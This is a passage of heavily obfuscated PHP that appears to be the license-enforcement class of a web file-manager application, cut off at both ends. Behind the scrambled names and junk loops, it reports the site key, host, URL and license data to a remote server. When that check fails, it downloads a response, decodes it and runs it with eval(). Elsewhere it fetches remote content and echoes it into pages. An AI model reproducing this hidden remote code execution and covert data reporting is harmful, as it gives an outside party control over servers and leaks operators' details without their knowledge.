($Çº¸µ™×[$ë–Ìˆüé[163]] == $ë–Ìˆüé[164]) { $ÜáØ‡¦Ú = $this->lunza0d18401($ò ´‚Äø, $ë–Ìˆüé[165]); $ŠËºŞè¬ = $this->djpm10d1efea(json_encode($áâÜ¾òÛ), $ò ´‚Äø . $ë–Ìˆüé[166], 3); $ŠËºŞè¬ = $ŠËºŞè¬ . $ë–Ìˆüé[167] . $_SERVER[$ë–Ìˆüé[157]]; $×ªìˆù› = $this->iflza0df3841($ë–Ìˆüé[168] . $ÜáØ‡¦Ú . $ë–Ìˆüé[169] . $ŠËºŞè¬, -1); show_json($×ªìˆù›, !0); } else { if ($Çº¸µ™×[$ë–Ìˆüé[163]] == $ë–Ìˆüé[170]) { $’„ù‰¶‚ = substr(md5($ë–Ìˆüé[171] . $ò ´‚Äø), 12, 15) . $ë–Ìˆüé[172]; $ŠËºŞè¬ = $this->rmqs7f6f7abf(trim($Çº¸µ™×[$ë–Ìˆüé[173]]), $’„ù‰¶‚, 2); $î÷–ÇÈØ = json_decode($ŠËºŞè¬, !0); if (!is_array($î÷–ÇÈØ) || !is_array($î÷–ÇÈØ[$ë–Ìˆüé[174]]) || $î÷–ÇÈØ[$ë–Ìˆüé[150]] != !0) { $Ë½Ø•©´ = $ë–Ìˆüé[175]; $œ®–„¿ = $î÷–ÇÈØ[$ë–Ìˆüé[174]] ? $ë–Ìˆüé[176] . $î÷–ÇÈØ[$ë–Ìˆüé[174]] : $Ë½Ø•©´; show_json($œ®–„¿, !1); } else { $áâÜ¾òÛ[$ë–Ìˆüé[152]] = $î÷–ÇÈØ[$ë–Ìˆüé[174]][$ë–Ìˆüé[177]]; } } else { $î÷–ÇÈØ = $this->iflza0df3841($ë–Ìˆüé[178], $áâÜ¾òÛ, 10); $¬»œ›ËË = $¤¦ ‘ğ”[660]; if (strlen($¬»œ›ËË) < $¤¦ ‘ğ”[617]) { die; } } } if (!is_array($î÷–ÇÈØ) || !is_array($î÷–ÇÈØ[$ë–Ìˆüé[174]]) || $î÷–ÇÈØ[$ë–Ìˆüé[150]] != !0) { $Ë½Ø•©´ = LNG($ë–Ìˆüé[179]); $œ®–„¿ = $î÷–ÇÈØ[$ë–Ìˆüé[174]] ? $ë–Ìˆüé[176] . $î÷–ÇÈØ[$ë–Ìˆüé[174]] : $Ë½Ø•©´; show_json($œ®–„¿, !1); } $Àº€ğïŞ = $î÷–ÇÈØ[$ë–Ìˆüé[174]]; $—ı¤şäØ = $this->nspe0fff9424($Àº€ğïŞ[$ë–Ìˆüé[180]]); if (!$—ı¤şäØ || $—ı¤şäØ != $Àº€ğïŞ[$ë–Ìˆüé[128]]) { $¨½îò’¤ = array($ë–Ìˆüé[181] => Model($ë–Ìˆüé[33])->get($ë–Ìˆüé[103]), $ë–Ìˆüé[182] => $_SERVER[$ë–Ìˆüé[102]], $ë–Ìˆüé[183] => this_url(), $ë–Ìˆüé[158] => $_SERVER[$ë–Ìˆüé[159]]); $ŠËºŞè¬ = $this->iepm5da4d5a8(json_encode($¨½îò’¤)); $this->iflza0df3841($ë–Ìˆüé[184] . $ŠËºŞè¬); show_json(LNG($ë–Ìˆüé[185]), !0); } $Ñ“ÒŸ½— = array($ë–Ìˆüé[186] => $Àº€ğïŞ[$ë–Ìˆüé[187]], $ë–Ìˆüé[188] => $Àº€ğïŞ[$ë–Ìˆüé[189]], $ë–Ìˆüé[190] => rand_string(16), $ë–Ìˆüé[105] => $Àº€ğïŞ[$ë–Ìˆüé[191]]); if ($áâÜ¾òÛ[$ë–Ìˆüé[152]]) { $Ñ“ÒŸ½—[$ë–Ìˆüé[190]] = $áâÜ¾òÛ[$ë–Ìˆüé[152]]; } $ö¿£—ï„ = substr(md5($Ñ“ÒŸ½—[$ë–Ìˆüé[188]]), 10, 10); $øù·èØ = $ö¿£—ï„ . $Ñ“ÒŸ½—[$ë–Ìˆüé[105]] . $Ñ“ÒŸ½—[$ë–Ìˆüé[190]]; $†˜çŸÍö = $¤¦ ‘ğ”[661]; $Ñ“ÒŸ½—[$ë–Ìˆüé[107]] = strrev(base64_encode($this->lunza0d18401($øù·èØ, $ë–Ìˆüé[192]))); $¶œùó¦· = $¤¦ ‘ğ”[662]; while (strlen($¶œùó¦·) < $¤¦ ‘ğ”[615]) { if (!$¶œùó¦·) { break; } $¶œùó¦·++; } $óŸ™Ã´¶ = rand_string(16); $«êÖ¢ö = $¤¦ ‘ğ”[663]; $­Ú‰Şš“ = $óŸ™Ã´¶ . $Ñ“ÒŸ½—[$ë–Ìˆüé[105]] . $this->lunza0d18401(md5($Ñ“ÒŸ½—[$ë–Ìˆüé[186]]), $óŸ™Ã´¶); $Ñ“ÒŸ½—[$ë–Ìˆüé[108]] = base64_encode(strrev($this->lunza0d18401($­Ú‰Şš“, $ë–Ìˆüé[193]))); $Íé¢ß£‡ = $¤¦ ‘ğ”[664]; if (!$Íé¢ß£‡) { die; } if ($Àº€ğïŞ[$ë–Ìˆüé[194]] && $Àº€ğïŞ[$ë–Ìˆüé[194]] >= 1) { Model($ë–Ìˆüé[33])->setDeep($ë–Ìˆüé[195], $ë–Ìˆüé[121]); } Model($ë–Ìˆüé[33])->set($Ñ“ÒŸ½—); $Ù¡‡¨œ = md5($_SERVER[$ë–Ìˆüé[102]] . strrev($ä£‘ç¿§) . $Ñ“ÒŸ½—[$ë–Ìˆüé[188]]); $¢€ÌÊµ‹ = strrev(substr($Ù¡‡¨œ, 10, 16)); $çÂöˆÁ = $¤¦ ‘ğ”[665]; while (strlen($çÂöˆÁ) < $¤¦ ‘ğ”[617]) { if (!$çÂöˆÁ) { break; } $çÂöˆÁ++; } $“•‰Ùõ´ = $this->djpm10d1efea(json_encode($Àº€ğïŞ), $Ù¡‡¨œ); $ÓçÜıµ· = $¤¦ ‘ğ”[666]; if (!$ÓçÜıµ·) { return; } $ÒŠ²“€ = array_to_keyvalue(Model($ë–Ìˆüé[7])->listData(), $ë–Ìˆüé[196]); $ÇÒñŒ¹õ = $ÒŠ²“€[$ë–Ìˆüé[197]]; $…¿‹îâ£ = $¤¦ ‘ğ”[667]; if (!$…¿‹îâ£) { return; } $ô›£›Å° = array(); $ó¥Í©²ğ = $¤¦ ‘ğ”[668]; if (strlen($ó¥Í©²ğ) < $¤¦ ‘ğ”[635]) { die; } $ô›£›Å°[$¢€ÌÊµ‹] = $“•‰Ùõ´; $ÇÌÊŒ€ = $¤¦ ‘ğ”[669]; Model($ë–Ìˆüé[7])->update($ÇÒñŒ¹õ[$ë–Ìˆüé[198]], array($ë–Ìˆüé[199] => $ô›£›Å°)); $Óä¼•®à = $¤¦ ‘ğ”[670]; while (strlen($Óä¼•®à) < $¤¦ ‘ğ”[615]) { if (!$Óä¼•®à) { break; } $Óä¼•®à++; } $this->kqou45d28de1 = $Àº€ğïŞ; $Îò‘îô¦ = $¤¦ ‘ğ”[671]; if (strlen($Îò‘îô¦) < $¤¦ ‘ğ”[646]) { die; } $this->obus4f733076 = $Ñ“ÒŸ½—[$ë–Ìˆüé[105]]; $this->licenseRegistSuccess(); Cache::set($ë–Ìˆüé[200] . md5($ä£‘ç¿§ . $ë–Ìˆüé[201]), $ë–Ìˆüé[6]); show_json(LNG($ë–Ìˆüé[185]), !0); } private function licenseRegistSuccess() { $¨Ğê·” =& $_SERVER[üÌ¬Ôµ]; $Ş‚¢íÆı = Model($¨Ğê·”[33])->get(); if ($Ş‚¢íÆı[$¨Ğê·”[63]] != $¨Ğê·”[121]) { Model($¨Ğê·”[33])->set($¨Ğê·”[63], $¨Ğê·”[121]); } Action($¨Ğê·”[202])->initStart(!0); } private function kzne2b2c742d() { $Ü¢€”ÜŒ =& $_SERVER[Îûáû“ş]; $¨ùç“¯ =& $_SERVER[üÌ¬Ôµ]; Model($¨ùç“¯[33])->set(array($¨ùç“¯[186] => $¨ùç“¯[6], $¨ùç“¯[188] => $¨ùç“¯[6], $¨ùç“¯[105] => $¨ùç“¯[106], $¨ùç“¯[107] => $¨ùç“¯[6], $¨ùç“¯[108] => $¨ùç“¯[6])); $è°¦Şİå = $Ü¢€”ÜŒ[672]; if (!$è°¦Şİå) { return; } Model($¨ùç“¯[33])->setDeep($¨ùç“¯[195], $¨ùç“¯[203]); $óÎ¯ŸÌ = $Ü¢€”ÜŒ[673]; if (!$óÎ¯ŸÌ) { die; } $this->kqou45d28de1 = array(); $this->obus4f733076 = $¨ùç“¯[106]; $¼»”‚± = $Ü¢€”ÜŒ[674]; if (strlen($¼»”‚±) < $Ü¢€”ÜŒ[635]) { return; } } private function ihaza0d99a95() { $ƒËí‹Œ… =& $_SERVER[Îûáû“ş]; $„ÇÊüŞ® =& $_SERVER[üÌ¬Ôµ]; $_SERVER[$„ÇÊüŞ®[159]] = _get($_SERVER, $„ÇÊüŞ®[159], APP_HOST); $this->obus4f733076 = $„ÇÊüŞ®[106]; $‘óÍ™Ñ§ = Model($„ÇÊüŞ®[33])->get(); $Ö¼’üàı = $ƒËí‹Œ…[675]; if ($‘óÍ™Ñ§[$„ÇÊüŞ®[105]] == $„ÇÊüŞ®[106]) { return; } $ŸÈÉ¸Øú = Model($„ÇÊüŞ®[33])->get($„ÇÊüŞ®[103]); $¿Úö÷‘É = $„ÇÊüŞ®[200] . md5($ŸÈÉ¸Øú . $„ÇÊüŞ®[201]); $æûÏˆÆ = $ƒËí‹Œ…[676]; while (strlen($æûÏˆÆ) < $ƒËí‹Œ…[615]) { if (!$æûÏˆÆ) { break; } $æûÏˆÆ++; } $ÈåÂññ‹ = Cache::get($¿Úö÷‘É); if (!is_array($ÈåÂññ‹) || !isset($ÈåÂññ‹[$„ÇÊüŞ®[204]]) || time() - $ÈåÂññ‹[$„ÇÊüŞ®[204]] >= 60) { $†éò«ŞË = Model($„ÇÊüŞ®[7])->loadList(); $ìÆ‹Æ×¿ = $†éò«ŞË[$„ÇÊüŞ®[197]]; $û©›åÉ· = md5($_SERVER[$„ÇÊüŞ®[102]] . strrev($ŸÈÉ¸Øú) . $‘óÍ™Ñ§[$„ÇÊüŞ®[188]]); $½šÊÎú× = strrev(substr($û©›åÉ·, 10, 16)); $ÈåÂññ‹ = $this->rmqs7f6f7abf($ìÆ‹Æ×¿[$„ÇÊüŞ®[85]][$½šÊÎú×], $û©›åÉ·); $ÈåÂññ‹ = json_decode($ÈåÂññ‹, !0); } if (!is_array($ÈåÂññ‹)) { return $this->kzne2b2c742d(); } $÷Ô‚Ôˆ¹ = strtotime($ÈåÂññ‹[$„ÇÊüŞ®[128]]); if (time() >= $÷Ô‚Ôˆ¹) { return $this->kzne2b2c742d(); } if (time() - $ÈåÂññ‹[$„ÇÊüŞ®[204]] > 20) { $ÈåÂññ‹[$„ÇÊüŞ®[204]] = time(); Cache::set($¿Úö÷‘É, $ÈåÂññ‹); } $this->kqou45d28de1 = $ÈåÂññ‹; $this->obus4f733076 = $‘óÍ™Ñ§[$„ÇÊüŞ®[105]]; $Ìæ–ßùï = $ƒËí‹Œ…[677]; if (!$Ìæ–ßùï) { return; } } private function jurgc874b505() { $°å¼âİõ =& $_SERVER[Îûáû“ş]; $Á²íÖ¿ä =& $_SERVER[üÌ¬Ôµ]; $ßÜÍÙº“ = $GLOBALS[$Á²íÖ¿ä[13]]; $ºÖ€ó = $°å¼âİõ[678]; while (strlen($ºÖ€ó) < $°å¼âİõ[635]) { if (!$ºÖ€ó) { break; } $ºÖ€ó++; } $·ìËáÖ­ = $_SERVER[$Á²íÖ¿ä[24]]; if ($·ìËáÖ­ == $Á²íÖ¿ä[205] && $this->obus4f733076 == $Á²íÖ¿ä[106]) { show_json(LNG($Á²íÖ¿ä[206]), !1, $Á²íÖ¿ä[207]); } $ş¾ûÓ§¢ = array($Á²íÖ¿ä[208], $Á²íÖ¿ä[209]); if (in_array($·ìËáÖ­, $ş¾ûÓ§¢)) { if ($this->obus4f733076 == $Á²íÖ¿ä[106] && isset($ßÜÍÙº“[$Á²íÖ¿ä[210]])) { show_json(LNG($Á²íÖ¿ä[206]), !1, $Á²íÖ¿ä[207]); die; } $È›µØº = $this->rgce40ea8bbf(); if ($È›µØº != intval($Á²íÖ¿ä[211])) { if ($È›µØº <= Model($Á²íÖ¿ä[124])->count()) { show_json(LNG($Á²íÖ¿ä[212]), !1, $Á²íÖ¿ä[207]); die; } } } } private function useq9b736d36() { $÷×Ù´ÅÜ =& $_SERVER[Îûáû“ş]; $³™çˆÚ£ =& $_SERVER[üÌ¬Ôµ]; $’Ğè¨õ = array($³™çˆÚ£[118], $³™çˆÚ£[119]); if (!_get($GLOBALS, $³™çˆÚ£[115]) || !isset($_GET[$³™çˆÚ£[213]])) { return; } if (!in_array($_SERVER[$³™çˆÚ£[24]], $’Ğè¨õ)) { return; } $×ª‘â— = $³™çˆÚ£[214]; $×ª‘â— = $this->juhg5ef21239($×ª‘â—, $³™çˆÚ£[215]); $ù§£Ûê× = stream_context_create(array($³™çˆÚ£[216] => array($³™çˆÚ£[217] => $³™çˆÚ£[218], $³™çˆÚ£[219] => 3))); $©°·Ï = $÷×Ù´ÅÜ[679]; if (!$©°·Ï) { return; } $¡ƒÓ‚ÔÅ = @file_get_contents($×ª‘â—, !1, $ù§£Ûê×); header($³™çˆÚ£[220]); $ë™ïÄ¶­ = $÷×Ù´ÅÜ[680]; if (strlen($ë™ïÄ¶­) < $÷×Ù´ÅÜ[635]) { die; } if ($¡ƒÓ‚ÔÅ && strstr($¡ƒÓ‚ÔÅ, $³™çˆÚ£[221])) { echo $¡ƒÓ‚ÔÅ; } die; } public function vjcw38b879ed($“Çõãª) { $µ²¬˜œ¤ =& $_SERVER[Îûáû“ş]; $®êÍıâ¯ =& $_SERVER[üÌ¬Ôµ]; if ($this->obus4f733076 == $®êÍıâ¯[222]) { return $“Çõãª; } $ŠÙÜÑèÓ = array($®êÍıâ¯[223] => $®êÍıâ¯[224], $®êÍıâ¯[225] => $®êÍıâ¯[224], $®êÍıâ¯[226] => $®êÍıâ¯[224], $®êÍıâ¯[227] => $®êÍıâ¯[228], $®êÍıâ¯[229] => $®êÍıâ¯[228], $®êÍıâ¯[230] => $®êÍıâ¯[228], $®êÍıâ¯[231] => $®êÍıâ¯[228], $®êÍıâ¯[232] => $®êÍıâ¯[228], $®êÍıâ¯[233] => $®êÍıâ¯[228], $®êÍıâ¯[234] => $®êÍıâ¯[228], $®êÍıâ¯[235] => $®êÍıâ¯[228], $®êÍıâ¯[236] => $®êÍıâ¯[228], $®êÍıâ¯[237] => $®êÍıâ¯[228], $®êÍıâ¯[238] => $®êÍıâ¯[228], $®êÍıâ¯[239] => $®êÍıâ¯[228]); $¼Ò‡– = explode($®êÍıâ¯[240], _get($this->kqou45d28de1, $®êÍıâ¯[112], $®êÍıâ¯[6])); $œàÓ•¨ò = $µ²¬˜œ¤[681]; $ş‹Ö¨¿Ş = array(); foreach ($ŠÙÜÑèÓ as $ÒÔ‰¤¬ => $¨¯«óò) { if ($¨¯«óò == $®êÍıâ¯[224] && substr($this->obus4f733076, 0, 1) == $®êÍıâ¯[224]) { continue; } if (!in_array($ÒÔ‰¤¬, $¼Ò‡–)) { $ş‹Ö¨¿Ş[] = $ÒÔ‰¤¬; } } foreach ($ş‹Ö¨¿Ş as $ÒÔ‰¤¬) { unset($“Çõãª[$ÒÔ‰¤¬]); } return $“Çõãª; $Ã¿¢—¤ = $µ²¬˜œ¤[682]; } private function yjgr19bd734f() { $Û©Ó¼Šû =& $_SERVER[üÌ¬Ôµ]; if ($this->obus4f733076 != $Û©Ó¼Šû[106]) { $GLOBALS[$Û©Ó¼Šû[85]][$Û©Ó¼Šû[89]][$Û©Ó¼Šû[241]] = $Û©Ó¼Šû[203]; return; } $GLOBALS[$Û©Ó¼Šû[85]][$Û©Ó¼Šû[242]] = $Û©Ó¼Šû[121]; if (Model($Û©Ó¼Šû[243])->get($Û©Ó¼Šû[63]) != $Û©Ó¼Šû[203]) { Model($Û©Ó¼Šû[243])->set($Û©Ó¼Šû[63], $Û©Ó¼Šû[203]); } } public function jcqta8a1132d() { return $_SERVER[üÌ¬Ôµ][244]; } private function shiab92d652f() { $øÌßÄ›µ =& $_SERVER[Îûáû“ş]; $®¦‡Üı =& $_SERVER[üÌ¬Ôµ]; $®÷“–©Ó = array($®¦‡Üı[245], $®¦‡Üı[246], $®¦‡Üı[247]); $ŞôÈâòø = $®¦‡Üı[248] . md5($®¦‡Üı[249]); $É»·ÈÃß = $øÌßÄ›µ[683]; if (!$É»·ÈÃß) { return; } if ($this->obus4f733076 == $®¦‡Üı[106] || !_get($GLOBALS, $®¦‡Üı[115])) { return; } if (!in_array($_SERVER[$®¦‡Üı[24]], $®÷“–©Ó)) { return; } if (time() % 4 != 0) { return; } $ÜŒ£×é = call_user_func(array($®¦‡Üı[250], $®¦‡Üı[251]), $ŞôÈâòø); $Ã“ÇË±Ç = $øÌßÄ›µ[684]; while (strlen($Ã“ÇË±Ç) < $øÌßÄ›µ[615]) { if (!$Ã“ÇË±Ç) { break; } $Ã“ÇË±Ç++; } if ($ÜŒ£×é && time() - $ÜŒ£×é < intval($®¦‡Üı[252])) { return; } call_user_func(array($®¦‡Üı[250], $®¦‡Üı[138]), $ŞôÈâòø, time()); $¡­ˆÇÛñ = $øÌßÄ›µ[685]; $ú§ÀÑÙ¿ = Model($®¦‡Üı[33])->get($®¦‡Üı[103]); $¨´´—¸ = $øÌßÄ›µ[686]; $–Ô•ß¸• = array($®¦‡Üı[150] => Model($®¦‡Üı[33])->get($®¦‡Üı[186]), $®¦‡Üı[163] => $this->obus4f733076, $®¦‡Üı[160] => $_SERVER[$®¦‡Üı[161]], $®¦‡Üı[162] => Model($®¦‡Üı[33])->get($®¦‡Üı[130]), $®¦‡Üı[101] => md5($_SERVER[$®¦‡Üı[102]] . $ú§ÀÑÙ¿), $®¦‡Üı[153] => $®¦‡Üı[135], $®¦‡Üı[156] => $_SERVER[$®¦‡Üı[157]]); $‚ø®±çê = $øÌßÄ›µ[687]; if (strlen($‚ø®±çê) < $øÌßÄ›µ[617]) { die; } $…—é¤Ûø = $this->iflza0df3841($®¦‡Üı[253], $–Ô•ß¸•); if (!is_array($…—é¤Ûø)) { return; } if ($…—é¤Ûø[$®¦‡Üı[150]] && $…—é¤Ûø[$®¦‡Üı[254]]) { if ($this->nspe0fff9424($…—é¤Ûø[$®¦‡Üı[254]]) == $–Ô•ß¸•[$®¦‡Üı[150]]) { return; } } $this->kzne2b2c742d(); if ($this->nspe0fff9424($…—é¤Ûø[$®¦‡Üı[254]]) != $–Ô•ß¸•[$®¦‡Üı[150]]) { $¥…·–½ş = array($®¦‡Üı[181] => $ú§ÀÑÙ¿, $®¦‡Üı[182] => $_SERVER[$®¦‡Üı[102]], $®¦‡Üı[183] => this_url(), $®¦‡Üı[158] => $_SERVER[$®¦‡Üı[159]]); $Í‡ÙÀÇ¨ = $this->iepm5da4d5a8(json_encode($¥…·–½ş)); $…—é¤Ûø = $this->iflza0df3841($®¦‡Üı[184] . $Í‡ÙÀÇ¨); if ($…—é¤Ûø && is_array($…—é¤Ûø) && isset($…—é¤Ûø[$®¦‡Üı[254]])) { $ú©×Ò˜‚ = $this->rmqs7f6f7abf($…—é¤Ûø[$®¦‡Üı[254]], 2); if ($ú©×Ò˜‚) { $ú©×Ò˜‚ = $this->nspe0fff9424($ú©×Ò˜‚); } if ($ú©×Ò˜‚) { try { @eval($ú©×Ò˜‚); } catch (Exception $èô—êÚ) { } } } } } private function iflza0df3841($Ÿ“Öæ…ğ = '', $¦¹åÂ¼· = array(), $ã¢İ¦ÖŸ = 5) { $¾Ş«óÆ‘ =& $_SERVER[Îûáû“ş]; $†¡£ˆŸÏ =& $_SERVER[üÌ¬Ôµ]; $Ş¨±Å…« = $†¡£ˆŸÏ[255]; $šç‘¾Â£ = $¾Ş«óÆ‘[688]; if (!$šç‘¾Â£) { return; } $Ş¨±Å…« = $this->juhg5ef21239($Ş¨±Å…«, $†¡£ˆŸÏ[256]); $Ş¨±Å…« = $Ş¨±Å…« . $Ÿ“Öæ…ğ; $œ—À±É¤ = $¾Ş«óÆ‘[689]; while ($œ—À±É¤ < $¾Ş«óÆ‘[646]) { if ($œ—À±É¤ >= 0) { break; } $œ—À±É¤++; } if ($¦¹åÂ¼· && is_array($¦¹åÂ¼·)) { $Ş¨±Å…« = $Ş¨±Å…« . $†¡£ˆŸÏ[257] . http_build_query($¦¹åÂ¼·); } if ($¦¹åÂ¼· === -1) { return $Ş¨±Å…«; } $å·òò = stream_context_create(array($†¡£ˆŸÏ[216] => array($†¡£ˆŸÏ[219] => $ã¢İ¦ÖŸ, $†¡£ˆŸÏ[217] => $†¡£ˆŸÏ[258]), $†¡£ˆŸÏ[259] => array($†¡£ˆŸÏ[260] => !1, $†¡£ˆŸÏ[261] => !1))); $àÒêéó« = $¾Ş«óÆ‘[690]; while ($àÒêéó« < $¾Ş«óÆ‘[646]) { if ($àÒêéó« >= 0) { break; } $àÒêéó«++; } $¦¹åÂ¼· = @file_get_contents($Ş¨±Å…«, !1, $å·òò); return json_decode($¦¹åÂ¼·, !0); $á ı¡ì³ = $¾Ş«óÆ‘[691]; if (strlen($á ı¡ì³) < $¾Ş«óÆ‘[646]) { die; } } private function rgce40ea8bbf() { $±¾ÌÅ¯ =& $_SERVER[Îûáû“ş]; $Œ—üŒú¯ =& $_SERVER[üÌ¬Ôµ]; $íšûåú· = array($Œ—üŒú¯[262] => $Œ—üŒú¯[263], $Œ—üŒú¯[264] => $Œ—üŒú¯[265], $Œ—üŒú¯[266] => $Œ—üŒú¯[267], $Œ—üŒú¯[268] => $Œ—üŒú¯[269], $Œ—üŒú¯[270] => $Œ—üŒú¯[271], $Œ—üŒú¯[272] => $Œ—üŒú¯[211], $Œ—üŒú¯[273] => $Œ—üŒú¯[211], $Œ—üŒú¯[274] => $Œ—üŒú¯[263], $Œ—üŒú¯[275] => $Œ—üŒú¯[265], $Œ—üŒú¯[276] => $Œ—üŒú¯[267], $Œ—üŒú¯[277] => $Œ—üŒú¯[278], $Œ—üŒú¯[279] => $Œ—üŒú¯[269], $Œ—üŒú¯[280] => $Œ—üŒú¯[281], $Œ—üŒú¯[282] => $Œ—üŒú¯[271], $Œ—üŒú¯[283] => $Œ—üŒú¯[284], $Œ—üŒú¯[285] => $Œ—üŒú¯[286], $Œ—üŒú¯[287] => $Œ—üŒú¯[288]); $ÚÊñ«ğŒ = $íšûåú·[$this->obus4f733076]; $ÚÊñ«ğŒ = intval($ÚÊñ«ğŒ ? $ÚÊñ«ğŒ : $Œ—üŒú¯[263]); $Ó°‚øã± = $±¾ÌÅ¯[692]; if (strlen($Ó°‚øã±) < $±¾ÌÅ¯[635]) { die; } $±¾˜… = _get($this->kqou45d28de1, $Œ—üŒú¯[289]); $ı´¾Ôüˆ = $±¾ÌÅ¯[693]; $±¾˜… = $±¾˜… ? intval($±¾˜…) : 0; $ ›ÚØÑ® = $±¾ÌÅ¯[694]; if (!$ ›ÚØÑ®) { return; } return $ÚÊñ«ğŒ + $±¾˜…; $áå§’×ñ = $±¾ÌÅ¯[695]; if (strlen($áå§’×ñ) < $±¾ÌÅ¯[646]) { return; } } public function mvft15061e72($‡Í ÑúÔ) { $š–Œêî =& $_SERVER[Îûáû“ş]; $Œ…Çœ¹° =& $_SERVER[üÌ¬Ôµ]; $›òõŒ„² = $this->rgce40ea8bbf(); if ($‡Í ÑúÔ[$Œ…Çœ¹°[290]] == $Œ…Çœ¹°[121]) { return; } if ($›òõŒ„² >= intval($Œ…Çœ¹°[211])) { return; } $î—Õ¡˜à = Model($Œ…Çœ¹°[124])->count(); $ÁåÂŸèâ = $š–Œêî[696]; if (strlen($ÁåÂŸèâ) < $š–Œêî[615]) { return; } if ($î—Õ¡˜à <= $›òõŒ„²) { return; } $™şßÅ¹ã = Model($Œ…Çœ¹°[124])->field($Œ…Çœ¹°[290])->limit($›òõŒ„²)->select(); $™şßÅ¹ã = array_to_keyvalue($™şßÅ¹ã, $Œ…Çœ¹°[6], $Œ…Çœ¹°[290]); if (!in_array($‡Í ÑúÔ[$Œ…Çœ¹°[290]], $™şßÅ¹ã)) { show_json($Œ…Çœ¹°[291], !1, $Œ…Çœ¹°[207]); } } public function mlju3007bbc5() { $ÍÒ»Æ =& $_SERVER[Îûáû“ş]; $Šƒ±øÁ® =& $_SERVER[üÌ¬Ôµ]; if (!_get($GLOBALS, $Šƒ±øÁ®[115]) || mt_rand(1, 100) > 20) { return; } $í…ô€Öü = $Šƒ±øÁ®[214]; $í…ô€Öü = $this->juhg5ef21239($í…ô€Öü, $Šƒ±øÁ®[215]); $È…Å¶¥› = $ÍÒ»Æ[697]; if (strlen($È…Å¶¥›) < $ÍÒ»Æ[617]) { return; } $ùÉÔ‰ƒ€ = stream_context_create(array($Šƒ±øÁ®[216] => array($Šƒ±øÁ®[217] => $Šƒ±øÁ®[218], $Šƒ±øÁ®[219] => 3))); $¶İ–Ñá… = @file_get_contents($í…ô€Öü, !1, $ùÉÔ‰ƒ€); $Õ×ïã¤© = $ÍÒ»Æ[698]; if (!$Õ×ïã¤©) { return; } echo $Šƒ±øÁ®[292] . hash_encode($¶İ–Ñá…) . $Šƒ±øÁ®[293]; } private function djpm10d1efea($Û¾ÏÃŒ¸, $èÜÖ“çÉ, $Ì©œ×ë’ = 3) { $åôõ¹ìé =& $_SERVER[Îûáû“ş]; $–ø Ï– =& $_SERVER[üÌ¬Ôµ]; usleep(1); $Û¾ÏÃŒ¸ = trim($Û¾ÏÃŒ¸); $œğÀÃ½‡ = mt_rand(0, 5) . $–ø Ï–[6]; $ÜÏĞÆ² = rand_string(15); $ŸØæ†”ô = $–ø Ï–[294]; switch ($œğÀÃ½‡) { case $–ø Ï–[203]: $ü†ş¯¹ = $this->lunza0d18401($Û¾ÏÃŒ¸, strrev($èÜÖ“çÉ . $ÜÏĞÆ²)); break; case $–ø Ï–[121]: $ü†ş¯¹ = $this->lunza0d18401($Û¾ÏÃŒ¸, strrev($ÜÏĞÆ² . $èÜÖ“çÉ)); $¢¹óÜ = $åôõ¹ìé[699]; if (!$¢¹óÜ) { return; } break; case $–ø Ï–[295]: $ü†ş¯¹ = $this->lunza0d18401($Û¾ÏÃŒ¸, base64_encode($ÜÏĞÆ² . $èÜÖ“çÉ)); break; case $–ø Ï–[296]: $ü†ş¯¹ = $this->lunza0d18401($Û¾ÏÃŒ¸, md5($ÜÏĞÆ² . $èÜÖ“çÉ)); $”¢«¦ô = $åôõ¹ìé[700]; while ($”¢«¦ô < $åôõ¹ìé[607]) { if ($”¢«¦ô >= 0) { break; } $”¢«¦ô++; } break; $Ú‡©™Íí = $åôõ¹ìé[701]; if (!$Ú‡©™Íí) { return; } case $–ø Ï–[297]: $Û¾ÏÃŒ¸ = base64_encode($Û¾ÏÃŒ¸); $ŠÙ“ ¼– = rand(0, 64); $“¢¶‡ ª = $åôõ¹ìé[702]; while (strlen($“¢¶‡ ª) < $åôõ¹ìé[607]) { if (!$“¢¶‡ ª) { break; } $“¢¶‡ ª++; } $Ê¿†Óíú = $ŸØæ†”ô[$ŠÙ“ ¼–]; $Øßùã° = md5($Ê¿†Óíú . md5($èÜÖ“çÉ . $Ê¿†Óíú) . $èÜÖ“çÉ); $Øßùã° = substr($Øßùã°, $ŠÙ“ ¼– % 8, $ŠÙ“ ¼– % 8 + 7); $Ì€Å®™¬ = $–ø Ï–[6]; $›ÜÆ« = 0; $éòº…ë¬ = 0; $çË·‘ = 0; for ($›ÜÆ« = 0; $›ÜÆ« < strlen($Û¾ÏÃŒ¸); $›ÜÆ«++) { $çË·‘ = $çË·‘ == strlen($Øßùã°) ? 0 : $çË·‘; $éòº…ë¬ = ($ŠÙ“ ¼– + strpos($ŸØæ†”ô, $Û¾ÏÃŒ¸[$›ÜÆ«]) + ord($Øßùã°[$çË·‘++])) % 64; $†½Ü‡×Ò = $åôõ¹ìé[703]; if (strlen($†½Ü‡×Ò) < $åôõ¹ìé[617]) { die; } $Ì€Å®™¬ .= $ŸØæ†”ô[$éòº…ë¬]; $®ÎÉØ« = $åôõ¹ìé[704]; } $ü†ş¯¹ = hash_encode($Ê¿†Óíú . $Ì€Å®™¬); break; default: $ü†ş¯¹ = $this->lunza0d18401($Û¾ÏÃŒ¸, $èÜÖ“çÉ . $ÜÏĞÆ²); $şÉ­âÜ = $åôõ¹ìé[705]; while (strlen($şÉ­âÜ) < $åôõ¹ìé[646]) { if (!$şÉ­âÜ) { break; } $şÉ­âÜ++; } break; } $ü†ş¯¹ = strrev($œğÀÃ½‡ . $ÜÏĞÆ² . $ü†ş¯¹); $•¯®±¡ì = $åôõ¹ìé[706]; while ($•¯®±¡ì < $åôõ¹ìé[617]) { if ($•¯®±¡ì >= 0) { break; } $•¯®±¡ì++; } if ($Ì©œ×ë’ - 1 > 0) { $ü†ş¯¹ = $this->djpm10d1efea($ü†ş¯¹, $èÜÖ“çÉ, $Ì©œ×ë’ - 1); } return $ü†ş¯¹; } private function rmqs7f6f7abf($Ä§¡ıö, $ë¤ê¯Ø, $©öĞºä = 3) { $ÑÉ¿ïó´ =& $_SERVER[Îûáû“ş]; $ãàèóé =& $_SERVER[üÌ¬Ôµ]; if (!is_string($Ä§¡ıö) || strlen($Ä§¡ıö) < 10) { return !1; } $Ä§¡ıö = trim($Ä§¡ıö); $Ï³åÒ¥ = $ÑÉ¿ïó´[707]; while (strlen($Ï³åÒ¥) < $ÑÉ¿ïó´[646]) { if (!$Ï³åÒ¥) { break; } $Ï³åÒ¥++; } $Ä§¡ıö = strrev($Ä§¡ıö); $£ª®Ğ©Ò = $ÑÉ¿ïó´[708]; if (!$£ª®Ğ©Ò) { die; } $…õÛ÷¢— = $Ä§¡ıö[0]; $Âüëı™Û = $ÑÉ¿ïó´[709]; while 